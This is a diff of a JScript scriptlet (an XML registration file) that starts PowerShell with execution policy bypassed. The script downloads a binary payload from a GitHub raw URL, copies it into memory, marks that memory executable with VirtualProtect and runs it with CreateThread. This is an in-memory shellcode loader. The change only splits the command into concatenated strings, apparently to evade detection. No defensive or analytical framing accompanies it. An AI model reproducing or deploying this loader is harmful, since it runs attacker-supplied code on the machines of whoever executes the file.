@@ -4,7 +4,17 @@
 <script language="JScript">
 <![CDATA[
 var shell = new ActiveXObject("WScript.Shell");
-shell.Run("powershell -ExecutionPolicy Bypass -NoProfile -Command \"$wc=New-Object Net.WebClient;$sc=$wc.DownloadData('https://raw.githubusercontent.com/jodshot11-sudo/Mist-Auth/refs/heads/main/payload.bin');$va=[Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length);[Runtime.InteropServices.Marshal]::Copy($sc,0,$va,$sc.Length);$vp=Add-Type -MemberDefinition '[DllImport(\\\"kernel32.dll\\\")] public static extern bool VirtualProtect(IntPtr lpAddress,UIntPtr dwSize,uint flNewProtect,out uint lpflOldProtect);' -Name Kernel32 -PassThru;$op=0;$vp::VirtualProtect($va,$sc.Length,0x40,[ref]$op)|Out-Null;$ct=Add-Type -MemberDefinition '[DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,uint dwStackSize,IntPtr lpStartAddress,IntPtr lpParameter,uint dwCreationFlags,ref IntPtr lpThreadId);' -Name Kernel32Thread -PassThru;$th=0;$ct::CreateThread(0,0,$va,0,0,[ref]$th)|Out-Null;Start-Sleep 999\"", 1, false);
+var cmd = "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ";
+cmd += "\"$wc=New-Object Net.WebClient;";
+cmd += "$sc=$wc.DownloadData('https://raw.githubusercontent.com/jodshot11-sudo/Mist-Auth/refs/heads/main/payload.bin');";
+cmd += "$va=[Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length);";
+cmd += "[Runtime.InteropServices.Marshal]::Copy($sc,0,$va,$sc.Length);";
+cmd += "$vp=Add-Type -MemberDefinition '[DllImport(\\\"kernel32.dll\\\")] public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);' -Name K -Namespace W -PassThru;";
+cmd += "$o=0;$vp::VirtualProtect($va,$sc.Length,0x40,[ref]$o)|Out-Null;";
+cmd += "$ct=Add-Type -MemberDefinition '[DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,ref IntPtr t);' -Name T -Namespace W -PassThru;";
+cmd += "$t=0;$ct::CreateThread(0,0,$va,0,0,[ref]$t)|Out-Null;";
+cmd += "Start-Sleep 999\"";
+shell.Run(cmd, 1);
 ]]>
 </script>
 </registration>
